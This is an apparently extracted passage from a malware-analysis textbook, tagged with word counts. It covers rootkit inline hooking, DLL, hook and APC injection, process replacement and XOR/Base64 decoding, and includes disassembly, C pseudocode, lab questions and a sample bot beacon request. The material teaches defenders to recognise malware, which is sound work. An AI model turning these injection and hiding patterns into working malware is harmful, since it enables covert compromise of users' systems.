function to damage or change it, rather than jumping to malicious code.
An example of the inline hooking of the ZwDeviceIoControlFile function 
is shown in Listing 11-7. This function is used by programs like Netstat to 
retrieve network information from the system.
[Word Count: 55]

100014B4         mov     edi, offset ProcName; "ZwDeviceIoControlFile"
100014B9         mov     esi, offset ntdll ; "ntdll.dll"
100014BE         push    edi                     ; lpProcName
100014BF         push    esi                     ; lpLibFileName
100014C0         call    ds:LoadLibraryA
100014C6         push    eax                     ; hModule
100014C7         call    ds:GetProcAddress 
100014CD         test    eax, eax
100014CF         mov     Ptr_ZwDeviceIoControlFile, eax
[Word Count: 43]

The location of the function being hooked is acquired at . This rootkit’s 
goal is to install a 7-byte inline hook at the start of the ZwDeviceIoControlFile 
function in memory. Table 11-2 shows how the hook was initialized; the raw 
bytes are shown on the left, and the assembly is shown on the right.
[Word Count: 54]

100014D9        push    4 
100014DB        push    offset hooking_function_hide_Port_443
100014E0
push    offset unk_10004011 
100014E5
call    memcpy
[Word Count: 14]

10004010        db 0B8h
10004011
db    0
10004012        db    0
10004013        db    0
10004014        db    0
10004015        db 0FFh
10004016        db 0E0h
[Word Count: 21]

10004010        mov     eax, 0
10004015        jmp     eax
[Word Count: 7]

The patch bytes (10004010) and the hook location are then sent to a func-
tion that installs the inline hook, as shown in Listing 11-8.
[Word Count: 25]

100014ED         push    7 
100014EF         push    offset Ptr_ZwDeviceIoControlFile
100014F4         push    offset 10004010 ;patchBytes  
100014F9         push    edi 
100014FA         push    esi 
100014FB         call    Install_inline_hook
[Word Count: 21]

Now ZwDeviceIoControlFile will call the rootkit function first. The rootkit’s 
hooking function removes all traffic destined for port 443 and then calls the 
real ZwDeviceIoControlFile, so everything continues to operate as it did before 
the hook was installed.
Since many defense programs expect inline hooks to be installed at the 
beginning of functions, some malware authors have attempted to insert the 
jmp or the code modification further into the API code to make it harder 
to find.
[Word Count: 77]

Analyze the malware found in Lab11-01.exe.
[Word Count: 6]

2.
How does the malware achieve persistence?
[Word Count: 7]

3.
How does the malware steal user credentials?
[Word Count: 8]

4.
What does the malware do with stolen credentials?
[Word Count: 9]

5.
How can you use this malware to get user credentials from your test 
environment?
[Word Count: 15]

Analyze the malware found in Lab11-02.dll. Assume that a suspicious file 
named Lab11-02.ini was also found with this malware.
[Word Count: 19]

1.
What are the exports for this DLL malware?
[Word Count: 9]

2.
What happens after you attempt to install this malware using 
rundll32.exe?
[Word Count: 12]

3.
Where must Lab11-02.ini reside in order for the malware to install 
properly?
[Word Count: 13]

4.
How is this malware installed for persistence?
[Word Count: 8]

5.
What user-space rootkit technique does this malware employ?
[Word Count: 9]

7.
Which process(es) does this malware attack and why?
[Word Count: 9]

8.
What is the significance of the .ini file?
[Word Count: 9]

9.
How can you dynamically capture this malware’s activity with Wireshark?
[Word Count: 11]

Analyze the malware found in Lab11-03.exe and Lab11-03.dll. Make sure that 
both files are in the same directory during analysis.
[Word Count: 20]

1.
What interesting analysis leads can you discover using basic static 
analysis?
[Word Count: 12]

2.
What happens when you run this malware?
[Word Count: 8]

3.
How does Lab11-03.exe persistently install Lab11-03.dll?
[Word Count: 7]

4.
Which Windows system file does the malware infect?
[Word Count: 9]

6.
Where does the malware store the data it collects?
[Word Count: 10]

C O V E R T  M A L W A R E  L A U N C H I N G
[Word Count: 22]

As computer systems and users have become more 
sophisticated, malware, too, has evolved. For example, 
because many users know how to list processes with the 
Windows Task Manager (where malicious software used 
to appear), malware authors have developed many techniques to blend their 
malware into the normal Windows landscape, in an effort to conceal it.
This chapter focuses on some of the methods that malware authors use 
to avoid detection, called covert launching techniques. Here, you’ll learn how to 
recognize code constructs and other coding patterns that will help you to 
identify common ways that malware is covertly launched.
[Word Count: 99]

As discussed in the previous chapter, a launcher (also known as a loader) is a 
type of malware that sets itself or another piece of malware for immediate or 
future covert execution. The goal of a launcher is to set up things so that the 
malicious behavior is concealed from a user.
Launchers often contain the malware that they’re designed to load. The 
most common example is an executable or DLL in its own resource section.
[Word Count: 76]

Figure 12-1: DLL injection—the launcher malware cannot access the Internet until it 
injects into iexplore.exe.
[Word Count: 15]

hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, victimProcessID );
[Word Count: 6]

pNameInVictimProcess = VirtualAllocEx(hVictimProcess,...,sizeof(maliciousLibraryName),...,...);
WriteProcessMemory(hVictimProcess,...,maliciousLibraryName, sizeof(maliciousLibraryName),...);
GetModuleHandle("Kernel32.dll");
GetProcAddress(...,"LoadLibraryA");
 CreateRemoteThread(hVictimProcess,...,...,LoadLibraryAddress,pNameInVictimProcess,...,...);
[Word Count: 9]

Listing 12-1: C Pseudocode for DLL injection
[Word Count: 7]

Figure 12-2: DLL injection debugger view
[Word Count: 6]

Once you find DLL injection activity in disassembly, you should start 
looking for the strings containing the names of the malicious DLL and the 
victim process. In the case of Figure 12-2, we don’t see those strings, but they 
must be accessed before this code executes. The victim process name can 
often be found in a strncmp function (or equivalent) when the launcher
[Word Count: 63]

determines the victim process’s PID. To find the malicious DLL name, we 
could set a breakpoint at 0x407735 and dump the contents of the stack to 
reveal the value of Buffer as it is being passed to WriteProcessMemory.
Once you’re able to recognize the DLL injection code pattern and iden-
tify these important strings, you should be able to quickly analyze an entire 
group of malware launchers.
[Word Count: 67]

Rather than inject code into a host program, some malware uses a method 
known as process replacement to overwrite the memory space of a running pro-
cess with a malicious executable. Process replacement is used when a mal-
ware author wants to disguise malware as a legitimate process, without the 
risk of crashing a process through the use of process injection.
This technique provides the malware with the same privileges as the 
process it is replacing. For example, if a piece of malware were to perform 
a process-replacement attack on svchost.exe, the user would see a process
[Word Count: 97]

name svchost.exe running from C:\Windows\System32 and probably think noth-
ing of it. (This is a common malware attack, by the way.)
Key to process replacement is creating a process in a suspended state. This 
means that the process will be loaded into memory, but the primary thread 
of the process is suspended. The program will not do anything until an exter-
nal program resumes the primary thread, causing the program to start run-
ning. Listing 12-2 shows how a malware author achieves this suspended state 
by passing CREATE_SUSPENDED (0x4) as the dwCreationFlags parameter when per-
forming the call to CreateProcess.
[Word Count: 100]

00401535        push    edi             ; lpProcessInformation
00401536        push    ecx             ; lpStartupInfo
00401537        push    ebx             ; lpCurrentDirectory
00401538        push    ebx             ; lpEnvironment
00401539        push    CREATE_SUSPENDED ; dwCreationFlags
0040153B        push    ebx             ; bInheritHandles
0040153C        push    ebx             ; lpThreadAttributes
0040153D        lea     edx, [esp+94h+CommandLine] 
00401541        push    ebx             ; lpProcessAttributes
00401542        push    edx             ; lpCommandLine
00401543        push    ebx             ; lpApplicationName
00401544        mov     [esp+0A0h+StartupInfo.dwFlags], 101h
0040154F        mov     [esp+0A0h+StartupInfo.wShowWindow], bx
00401557        call    ds:CreateProcessA
[Word Count: 65]

Listing 12-2: Assembly code showing process replacement
[Word Count: 7]

Although poorly documented by Microsoft, this method of process cre-
ation can be used to load a process into memory and suspend it at the entry 
point.
Listing 12-3 shows C pseudocode for performing process replacement.
[Word Count: 36]

CreateProcess(...,"svchost.exe",...,CREATE_SUSPENDED,...);
ZwUnmapViewOfSection(...);
VirtualAllocEx(...,ImageBase,SizeOfImage,...);
WriteProcessMemory(...,headers,...);
for (i=0; i < NumberOfSections; i++) {
 WriteProcessMemory(...,section,...);
}
SetThreadContext();
...
ResumeThread();
[Word Count: 17]

Listing 12-3: C pseudocode for process replacement
[Word Count: 7]

Once the process is created, the next step is to replace the victim process’s 
memory with the malicious executable, typically using ZwUnmapViewOfSection 
to release all memory pointed to by a section passed as a parameter. After 
the memory is unmapped, the loader performs VirtualAllocEx to allocate
[Word Count: 46]

Hook injection describes a way to load malware that takes advantage of Win-
dows hooks, which are used to intercept messages destined for applications. 
Malware authors can use hook injection to accomplish two things:
[Word Count: 34]


To be sure that malicious code will run whenever a particular message is 
intercepted
[Word Count: 15]


To be sure that a particular DLL will be loaded in a victim process’s 
memory space
[Word Count: 17]

As shown in Figure 12-3, users generate events that are sent to the OS, 
which then sends messages created by those events to threads registered to 
receive them. The right side of the figure shows one way that an attacker can 
insert a malicious DLL to intercept messages.
[Word Count: 48]

Figure 12-3: Event and message flow in Windows 
with and without hook injection
[Word Count: 13]


Local hooks are used to observe or manipulate messages destined for an 
internal process.
[Word Count: 15]


Remote hooks are used to observe or manipulate messages destined for a 
remote process (another process on the system).
[Word Count: 20]

Remote hooks are available in two forms: high and low level. High-level 
remote hooks require that the hook procedure be an exported function con-
tained in a DLL, which will be mapped by the OS into the process space of a 
hooked thread or all threads. Low-level remote hooks require that the hook 
procedure be contained in the process that installed the hook. This proce-
dure is notified before the OS gets a chance to process the event.
[Word Count: 78]

The principal function call used to perform remote Windows hooking is 
SetWindowsHookEx, which has the following parameters:
[Word Count: 17]

idHook
Specifies the type of hook procedure to install.
[Word Count: 9]

hMod
For high-level hooks, identifies the handle to the DLL containing 
the hook procedure defined by lpfn. For low-level hooks, this identifies the 
local module in which the lpfn procedure is defined.
[Word Count: 32]

dwThreadId
Specifies the identifier of the thread with which the hook 
procedure is to be associated. If this parameter is zero, the hook proce-
dure is associated with all existing threads running in the same desktop 
as the calling thread. This must be set to zero for low-level hooks.
[Word Count: 49]

The hook procedure can contain code to process messages as they come 
in from the system, or it can do nothing. Either way, the hook procedure 
must call CallNextHookEx, which ensures that the next hook procedure in the 
call chain gets the message and that the system continues to run properly.
[Word Count: 51]

00401100        push    esi
00401101        push    edi
00401102        push    offset LibFileName ; "hook.dll"
00401107        call    LoadLibraryA
0040110D        mov     esi, eax
0040110F        push    offset ProcName ; "MalwareProc"
00401114        push    esi             ; hModule
00401115        call    GetProcAddress
0040111B        mov     edi, eax
0040111D        call    GetNotepadThreadId
00401122        push    eax             ; dwThreadId
00401123        push    esi 
; hmod
00401124        push    edi             ; lpfn
00401125        push    WH_CBT   ; idHook
00401127        call    SetWindowsHookExA
[Word Count: 63]

Listing 12-4: Hook injection, assembly code
[Word Count: 6]

Figure 12-4: A PEview of Detours and the evil.dll
[Word Count: 9]

Instead of using the official Microsoft Detours library, malware authors 
have been known to use alternative and custom methods to add a .detour 
section. The use of these methods for detour addition should not impact 
your ability to analyze the malware.
[Word Count: 41]

Earlier in this chapter, you saw that by creating a thread using CreateRemoteThread, 
you can invoke functionality in a remote process. However, thread creation 
requires overhead, so it would be more efficient to invoke a function on
[Word Count: 37]


An APC generated for the system or a driver is called a kernel-mode APC.
[Word Count: 15]


An APC generated for an application is called a user-mode APC.
[Word Count: 12]

Malware generates user-mode APCs from both kernel and user space 
using APC injection. Let’s take a closer look at each of these methods.
[Word Count: 23]

NOTE
During analysis, you can find thread-targeting code by looking for API calls such as 
CreateToolhelp32Snapshot, Process32First, and Process32Next for the malware to 
find the target process. These API calls will often be followed by calls to Thread32First 
and Thread32Next, which will be in a loop looking to target a thread contained in the 
target process. Alternatively, malware can also use Nt/ZwQuerySystemInformation with 
the SYSTEM_PROCESS_INFORMATION information class to find the target process.
[Word Count: 72]

00401DA9         push    [esp+4+dwThreadId]      ; dwThreadId
00401DAD         push    0                       ; bInheritHandle
00401DAF         push    10h                     ; dwDesiredAccess
00401DB1         call    ds:OpenThread 
00401DB7         mov     esi, eax
[Word Count: 23]

00401DB9         test    esi, esi
00401DBB         jz      short loc_401DCE
00401DBD         push    [esp+4+dwData]          ; dwData = dbnet.dll
00401DC1         push    esi                     ; hThread
00401DC2         push    ds:LoadLibraryA       ; pfnAPC
00401DC8         call    ds:QueueUserAPC
[Word Count: 29]

Listing 12-5: APC injection from a user-mode application
[Word Count: 8]

Malware drivers and rootkits often wish to execute code in user space, but 
there is no easy way for them to do it. One method they use is to perform 
APC injection from kernel space to get their code execution in user space. 
A malicious driver can build an APC and dispatch a thread to execute it in a 
user-mode process (most often svchost.exe). APCs of this type often consist of 
shellcode.
Device drivers leverage two major functions in order to utilize APCs: 
KeInitializeApc and KeInsertQueueApc. Listing 12-6 shows an example of these 
functions in use in a rootkit.
[Word Count: 99]

000119BD         push    ebx
000119BE         push    1 
000119C0         push    [ebp+arg_4] 
000119C3         push    ebx
000119C4         push    offset sub_11964
000119C9         push    2
000119CB         push    [ebp+arg_0] 
000119CE         push    esi
000119CF         call    ds:KeInitializeApc
000119D5         cmp     edi, ebx
000119D7         jz      short loc_119EA
000119D9         push    ebx
000119DA         push    [ebp+arg_C]
000119DD         push    [ebp+arg_8]
000119E0         push    esi
000119E1         call    edi       ;KeInsertQueueApc
[Word Count: 55]

Listing 12-6: User-mode APC injection from kernel space
[Word Count: 8]

Analyze the malware found in the file Lab12-01.exe and Lab12-01.dll. Make 
sure that these files are in the same directory when performing the analysis.
[Word Count: 24]

1.
What happens when you run the malware executable?
[Word Count: 9]

3.
How can you make the malware stop the pop-ups?
[Word Count: 10]

Analyze the malware found in the file Lab12-02.exe.
[Word Count: 8]

2.
How does the launcher program hide execution?
[Word Count: 8]

3.
Where is the malicious payload stored?
[Word Count: 7]

4.
How is the malicious payload protected?
[Word Count: 7]

Analyze the malware extracted during the analysis of Lab 12-2, or use the file 
Lab12-03.exe.
[Word Count: 15]

1.
What is the purpose of this malicious payload?
[Word Count: 9]

2.
How does the malicious payload inject itself?
[Word Count: 8]

3.
What filesystem residue does this program create?
[Word Count: 8]

Analyze the malware found in the file Lab12-04.exe.
[Word Count: 8]

1.
What does the code at 0x401000 accomplish?
[Word Count: 8]

3.
What DLL is loaded using LoadLibraryA?
[Word Count: 7]

4.
What is the fourth argument passed to the CreateRemoteThread call?
[Word Count: 11]

5.
What malware is dropped by the main executable?
[Word Count: 9]

6.
What is the purpose of this and the dropped malware?
[Word Count: 11]

In the context of malware analysis, the term data 
encoding refers to all forms of content modification 
for the purpose of hiding intent. Malware uses encod-
ing techniques to mask its malicious activities, and as 
a malware analyst, you’ll need to understand these 
techniques in order to fully understand the malware.
[Word Count: 51]

When using data encoding, attackers will choose the method that best 
meets their goals. Sometimes, they will choose simple ciphers or basic encod-
ing functions that are easy to code and provide enough protection; other 
times, they will use sophisticated cryptographic ciphers or custom encryption 
to make identification and reverse-engineering more difficult.
We begin this chapter by focusing on finding and identifying encoding 
functions. Then we will cover strategies for decoding.
[Word Count: 71]

The Goal of Analyzing Encoding Algorithms
[Word Count: 6]

Malware uses encoding for a variety of purposes. The most common use is 
for the encryption of network-based communication. Malware will also use 
encoding to disguise its internal workings. For example, a malware author 
might use a layer of encoding for these purposes:
[Word Count: 43]


To hide configuration information, such as a command-and-control 
domain
[Word Count: 10]


To save information to a staging file before stealing it
[Word Count: 11]


To store strings used by the malware and decode them just before they 
are needed
[Word Count: 16]


To disguise the malware as a legitimate tool, hiding the strings used for 
malicious activities
[Word Count: 16]

Our goal when analyzing encoding algorithms will always consist of two 
parts: identifying the encoding functions and then using that knowledge to 
decode the attacker’s secrets.
[Word Count: 26]

Simple encoding techniques have existed for thousands of years. While you 
might assume that the massive computing capacity of modern computers has 
made simple ciphers extinct, this is not the case. Simple encoding techniques 
are often used to disguise content so that it is not apparent that it is human-
readable or to transform data into a different character set.
Simple ciphers are often disparaged for being unsophisticated, but they 
offer many advantages for malware, including the following:
[Word Count: 78]


They are small enough to be used in space-constrained environments 
such as exploit shellcode.
[Word Count: 15]


They are less obvious than more complex ciphers.
[Word Count: 9]


They have low overhead and thus little impact on performance.
[Word Count: 11]

Malware authors who use a simple cipher don’t expect to be immune to 
detection; they’re simply looking for an easy way to prevent basic analysis 
from identifying their activities.
[Word Count: 29]

One of the first ciphers ever used was the Caesar cipher. The Caesar cipher 
was used during the Roman Empire to hide messages transported through 
battlefields by courier. It is a simple cipher formed by shifting the letters of 
the alphabet three characters to the right. For example, the following text 
shows a secret wartime message encrypted with the Caesar cipher:
[Word Count: 61]

Figure 13-1: The string ATTACK AT NOON encoded with an XOR of 0x3C (original string 
at the top; encoded strings at the bottom)
[Word Count: 23]

Imagine we are investigating a malware incident. We learn that seconds before 
the malware starts, two files are created in the browser’s cache directory. One 
of these files is an SWF file, which we assume is used to exploit the browser’s 
Flash plug-in. The other file is named a.gif, but it doesn’t appear to have a 
GIF header, which would start with the characters GIF87a or GIF89a. Instead, 
the a.gif file begins with the bytes shown in Listing 13-1.
[Word Count: 79]

0x41
0x54
0x54
0x41
0x41
0x54
0x43
0x4E
0x4F
0x4F
0x4E
0x4B
[Word Count: 12]

0x7d
0x68
0x68
0x7d
0x7F
0x77
0x1C
0x7d
0x68
0x1C
0x72
0x72
0x71
0x71
[Word Count: 14]

Listing 13-1: First bytes of XOR-encoded file a.gif
[Word Count: 8]

Notice in the last row of this table that using an XOR with 0x12 we find 
an MZ header. PE files begin with the letters MZ, and the hex characters for 
M and Z are 4d and 5a, respectively, the first two hex characters in this partic-
ular string.
Next, we examine a larger portion of the header, and we can now see 
other parts of the file, as shown in Listing 13-2.
[Word Count: 73]

Table 13-1: Brute-Force of XOR-Encoded Executable
[Word Count: 6]

XOR key value
Initial bytes of file
MZ header found?
[Word Count: 10]

Original
5F 48 42 12 10 12 12 12 16 12 1D 12 ED ED 12 
No
[Word Count: 17]

XOR with 0x01
5e 49 43 13 11 13 13 13 17 13 1c 13 ec ec 13
No
[Word Count: 19]

XOR with 0x02
5d 4a 40 10 12 10 10 10 14 10 1f 10 ef ef 10
No
[Word Count: 19]

XOR with 0x03
5c 4b 41 11 13 11 11 11 15 11 1e 11 ee ee 11
No
[Word Count: 19]

XOR with 0x04
5b 4c 46 16 14 16 16 16 12 16 19 16 e9 e9 16
No
[Word Count: 19]

XOR with 0x05
5a 4d 47 17 15 17 17 17 13 17 18 17 e8 e8 17
No
[Word Count: 19]

XOR with 0x12
4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00
Yes!
[Word Count: 19]

Listing 13-2: First bytes of the decrypted PE file
[Word Count: 9]

Here, we see the words This program mus. This is the start of the DOS stub, 
a common element within an executable file, which provides additional evi-
dence that this is indeed a PE file.
[Word Count: 35]

NULL-Preserving Single-Byte XOR Encoding
[Word Count: 4]

Look again at the encoded file shown in Listing 13-1. Notice how blatant the 
XOR key of 0x12 is, even at just a glance. Most of the bytes in the initial part 
of the header are 0x12! This demonstrates a particular weakness of single-
byte encoding: It lacks the ability to effectively hide from a user manually 
scanning encoded content with a hex editor. If the encoded content has a 
large number of NULL bytes, the single-byte “key” becomes obvious.
[Word Count: 80]

Table 13-2: Creating XOR Brute-Force Signatures
[Word Count: 6]

Original
54 68 69 73 20 70 72 6f 67 72 61 6d 20
[Word Count: 14]

XOR with 0x01
55 69 68 72 21 71 73 6e 66 73 60 6c 21
[Word Count: 16]

XOR with 0x02
56 6a 6b 71 22 72 70 6d 65 70 63 6f 22
[Word Count: 16]

XOR with 0x03
57 6b 6a 70 23 73 71 6c 64 71 62 6e 23
[Word Count: 16]

XOR with 0x04
50 6c 6d 77 24 74 76 6b 63 76 65 69 24
[Word Count: 16]

XOR with 0x05
51 6d 6c 76 25 75 77 6a 62 77 64 68 25
[Word Count: 16]

XOR with 0xFF
ab 97 96 8c df 8f 8d 90 98 8d 9e 92 df
[Word Count: 16]

Malware authors have actually developed a clever way to mitigate this 
issue by using a NULL-preserving single-byte XOR encoding scheme. Unlike 
the regular XOR encoding scheme, the NULL-preserving single-byte XOR 
scheme has two exceptions:
[Word Count: 34]


If the plaintext character is NULL or the key itself, then the byte is 
skipped.
[Word Count: 16]


If the plaintext character is neither NULL nor the key, then it is encoded 
via an XOR with the key.
[Word Count: 21]

As shown in Table 13-3, the code for this modified XOR is not much 
more complicated than the original.
[Word Count: 19]

Listing 13-3: First bytes of file with NULL-preserving XOR encoding
[Word Count: 10]

This NULL-preserving XOR technique is especially popular in shellcode, 
where it is important to be able to perform encoding with a very small 
amount of code.
[Word Count: 26]

Now imagine that you find the shellcode within the SWF file. You are dis-
assembling the shellcode in IDA Pro, and you want to find the XOR loop that 
you suspect exists to decode the associated a.gif file.
[Word Count: 38]

Table 13-3: Original vs. NULL-Preserving XOR Encoding Code
[Word Count: 8]

buf[i] ^= key;
if (buf[i] != 0 && buf[i] != key)
    buf[i] ^= key;
[Word Count: 14]

In disassembly, XOR loops can be identified by small loops with an XOR 
instruction in the middle of a loop. The easiest way to find an XOR loop in 
IDA Pro is to search for all instances of the XOR instruction, as follows:
[Word Count: 43]

1.
Make sure you are viewing code (the window title should contain 
“IDA View”).
[Word Count: 14]

3.
In the Text Search dialog, enter xor, select the Find all occurrences 
checkbox, and then click OK. You should see a window like the one 
shown in Figure 13-2.
[Word Count: 30]

Figure 13-2: Searching for XOR in IDA Pro
[Word Count: 8]

Just because a search found an XOR instruction does not mean that the 
XOR instruction is being used for encoding. The XOR instruction can be 
used for different purposes. One of the uses of XOR is to clear the contents 
of a register. XOR instructions can be found in three forms:
[Word Count: 51]


XOR of a register (or memory reference) with a constant
[Word Count: 11]


XOR of one register (or memory reference) with a different register (or 
memory reference)
[Word Count: 15]

does appear to be a part of a small loop. You can also see that the block at 
loc_4012F4 increments a counter, and the block at loc_401301 checks to see 
whether the counter has exceeded a certain length.
[Word Count: 38]

Figure 13-3: Graphical view of single-byte XOR loop
[Word Count: 8]

Given the weaknesses of single-byte encoding, many malware authors have 
implemented slightly more involved (or just unexpected) encoding schemes 
that are less susceptible to brute-force detection but are still simple to imple-
ment. Table 13-4 briefly describes some of these encoding schemes. We won’t 
delve into the specifics of each of these techniques, but you should be aware 
of them so that you can recognize them if you see them.
[Word Count: 70]

Table 13-4: Additional Simple Encoding Algorithms
[Word Count: 6]

ADD, SUB
Encoding algorithms can use ADD and SUB for individual bytes in a 
manner that is similar to XOR. ADD and SUB are not reversible, so they 
need to be used in tandem (one to encode and the other to decode).
[Word Count: 42]

ROL, ROR
Instructions rotate the bits within a byte right or left. Like ADD and SUB, 
these need to be used together since they are not reversible.
[Word Count: 27]

ROT
This is the original Caesar cipher. It’s commonly used with either alpha-
betical characters (A–Z and a–z) or the 94 printable characters in stan-
dard ASCII.
[Word Count: 27]

Multibyte
Instead of a single byte, an algorithm might use a longer key, often 4 or 
8 bytes in length. This typically uses XOR for each block for convenience.
[Word Count: 29]

Content-Type: multipart/alternative;
    boundary="_002_4E36B98B966D7448815A3216ACF82AA201ED633ED1MBX3THNDRBIRD_" 
MIME-Version: 1.0
--_002_4E36B98B966D7448815A3216ACF82AA201ED633ED1MBX3THNDRBIRD_
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64
[Word Count: 11]

SWYgeW91IGFyZSByZWFkaW5nIHRoaXMsIHlvdSBwcm9iYWJseSBzaG91bGQganVzdCBza2lwIHRoaX
MgY2hhcHRlciBhbmQgZ28gdG8gdGhlIG5leHQgb25lLiBEbyB5b3UgcmVhbGx5IGhhdmUgdGhlIHRp
bWUgdG8gdHlwZSB0aGlzIHdob2xlIHN0cmluZyBpbj8gWW91IGFyZSBvYnZpb3VzbHkgdGFsZW50ZW
QuIE1heWJlIHlvdSBzaG91bGQgY29udGFjdCB0aGUgYXV0aG9ycyBhbmQgc2VlIGlmIH
[Word Count: 4]

Listing 13-4: Part of raw email message showing Base64 encoding
[Word Count: 10]

The process of translating raw data to Base64 is fairly standard. It uses 24-bit 
(3-byte) chunks. The first character is placed in the most significant position, 
the second in the middle 8 bits, and the third in the least significant 8 bits. 
Next, bits are read in blocks of six, starting with the most significant. The
[Word Count: 56]

Chained or
loopback
This algorithm uses the content itself as part of the key, with various imple-
mentations. Most commonly, the original key is applied at one side of the 
plaintext (start or end), and the encoded output character is used as the 
key for the next character.
[Word Count: 48]

Table 13-4: Additional Simple Encoding Algorithms (continued)
[Word Count: 7]

Let’s say we are investigating malware that appears to have made the two 
HTTP GET requests shown in Listing 13-5.
[Word Count: 20]

GET /X29tbVEuYC8=/index.htm
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: www.practicalmalwareanalysis.com
Connection: Keep-Alive
Cookie: Ym90NTQxNjQ
[Word Count: 16]

GET /c2UsYi1kYWM0cnUjdFlvbiAjb21wbFU0YP==/index.htm
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: www.practicalmalwareanalysis.com
Connection: Keep-Alive
Cookie: Ym90NTQxNjQ
[Word Count: 16]

With practice, it’s easy to identify Base64-encoded content. It appears 
as a random selection of characters, with the character set composed of the 
alphanumeric characters plus two other characters. One padding character
[Word Count: 32]

0
1
0
0
0
0
0
1
0
1
0
1
0
1
0
0
0
1
0
1
0
1
0
0
[Word Count: 24]

Figure 13-5: Unsuccessful attempt to decode Base64 string
[Word Count: 8]

Remember how every three characters from the input becomes four 
characters in the output, and how the four-character output blocks are pad-
ded? How many characters are in the Cookie string? Since there are 11, we 
know that if this is a Base64 string, it is not correctly padded.
Technically, the padding characters are optional, and they are not essen-
tial to accurate decoding. Malware has been known to avoid using padding 
characters, presumably to appear less like Base64 or to avoid network signa-
tures. In Figure 13-6, we add the padding and try again:
[Word Count: 95]

Figure 13-6: Successful decoding of Base64 string 
due to addition of padding character
[Word Count: 13]

Apparently, the attacker is tracking his bots by giving them identification 
numbers and Base64-encoding that into a cookie.
In order to find the Base64 function in the malware, we can look for the 
64-byte long string typically used to implement the algorithm. The most com-
monly used string adheres to the MIME Base64 standard. Here it is:
[Word Count: 57]

ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
[Word Count: 1]

Ym90NTQxNjQ
Error: invalid length for Base64 array
[Word Count: 7]

character set, padded with = to a length divisible by four. Figure 13-7 shows 
what we find when we run them through a Base64 decoder.
[Word Count: 25]

Figure 13-7: Unsuccessful attempt to decode Base64 string due to nonstandard indexing 
string
[Word Count: 13]

aABCDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstuvwxyz0123456789+/
[Word Count: 1]

Figure 13-8: Successful decoding of Base64 string using custom indexing string
[Word Count: 11]

Simple cipher schemes that are the equivalent of substitution ciphers differ 
greatly from modern cryptographic ciphers. Modern cryptography takes into 
account the exponentially increasing computing capabilities, and ensures 
that algorithms are designed to require so much computational power that 
breaking the cryptography is impractical.
[Word Count: 44]

c2UsYi1kYWM0cnUjdFlvbiAjb21wbFU0YP==
se,b-dac4ru#tYon #omplU4`
[Word Count: 3]

c2UsYi1kYWM0cnUjdFlvbiAjb21wbFU0YP==
self-destruction complete
[Word Count: 3]


Cryptographic libraries can be large, so malware may need to statically 
integrate the code or link to existing code.
[Word Count: 20]


Having to link to code that exists on the host may reduce portability.
[Word Count: 14]


Standard cryptographic libraries are easily detected (via function imports, 
function matching, or the identification of cryptographic constants).
[Word Count: 18]


Users of symmetric encryption algorithms need to worry about how to 
hide the key.
[Word Count: 15]

One way to identify standard cryptographic algorithms is by recognizing 
strings that refer to the use of cryptography. This can occur when crypto-
graphic libraries such as OpenSSL are statically compiled into malware. For 
example, the following is a selection of strings taken from a piece of malware 
compiled with OpenSSL encryption:
[Word Count: 52]

OpenSSL 1.0.0a
SSLv3 part of OpenSSL 1.0.0a
TLSv1 part of OpenSSL 1.0.0a
SSLv2 part of OpenSSL 1.0.0a
You need to read the OpenSSL FAQ, http://www.openssl.org/support/faq.html
%s(%d): OpenSSL internal error, assertion failed: %s
AES for x86, CRYPTOGAMS by <appro@openssl.org>
[Word Count: 38]

Another way to look for standard cryptography is to identify imports that 
reference cryptographic functions. For example, Figure 13-9 is a screenshot 
from IDA Pro showing some cryptographic imports that provide services
[Word Count: 32]

related to hashing, key generation, and encryption. Most (though not all) 
of the Microsoft functions that pertain to cryptography start with Crypt, CP 
(for Cryptographic Provider), or Cert.
[Word Count: 28]

Figure 13-9: IDA Pro imports listing showing cryptographic functions
[Word Count: 9]

A third basic method of detecting cryptography is to use a tool that can 
search for commonly used cryptographic constants. Here, we’ll look at using 
IDA Pro’s FindCrypt2 and Krypto ANALyzer.
[Word Count: 31]

IDA Pro has a plug-in called FindCrypt2, included in the IDA Pro SDK 
(or available from http://www.hex-rays.com/idapro/freefiles/findcrypt.zip), which 
searches the program body for any of the constants known to be associated 
with cryptographic algorithms. This works well, since most cryptographic algo-
rithms employ some type of magic constant. A magic constant is some fixed 
string of bits that is associated with the essential structure of the algorithm.
[Word Count: 67]

NOTE
Some cryptographic algorithms do not employ a magic constant. Notably, the Interna-
tional Data Encryption Algorithm (IDEA) and the RC4 algorithm build their struc-
tures on the fly, and thus are not in the list of algorithms that will be identified. 
Malware often employs the RC4 algorithm, probably because it is small and easy to 
implement in software, and it has no cryptographic constants to give it away.
[Word Count: 69]

FindCrypt2 runs automatically on any new analysis, or it can be run man-
ually from the plug-in menu. Figure 13-10 shows the IDA Pro output window 
with the results of running FindCrypt2 on a malicious DLL. As you can see, 
the malware contains a number of constants that begin with DES. By identify-
ing the functions that reference these constants, you can quickly get a handle 
on the functions that implement the cryptography.
[Word Count: 73]

Figure 13-11: PEiD and Krypto ANALyzer (KANAL) output
[Word Count: 8]

Another way to identify the use of cryptography is to search for high-entropy 
content. In addition to potentially highlighting cryptographic constants or 
cryptographic keys, this technique can also identify encrypted content itself. 
Because of the broad reach of this technique, it is potentially applicable in 
cases where cryptographic constants are not found (like RC4).
[Word Count: 54]

WARNING 
The high-entropy content technique is fairly blunt and may best be used as a last resort. 
Many types of content—such as pictures, movies, audio files, and other compressed 
data—display high entropy and are indistinguishable from encrypted content except for 
their headers.
[Word Count: 42]

(chunk size, step size, and maximum entropy) and scans the specified area 
for chunks that exceed the listed entropy. If you compare the output in Fig-
ure 13-10 with the results returned in the deep analysis results window in 
Figure 13-12, you will see that the same addresses around 0x100062A4 
are highlighted. The IDA Pro Entropy Plugin has found the DES constants 
(which indicates a high degree of entropy) with no knowledge of the con-
stants themselves!
[Word Count: 77]

Figure 13-13: Entropy graph for a malicious executable
[Word Count: 8]

A couple of other features stand out. One is the plateau between blocks 
4000 and 22000. This represents the actual code, and it is typical of code to 
reach an entropy value of this level. Code is typically contiguous, so it will 
form a series of connected peaks.
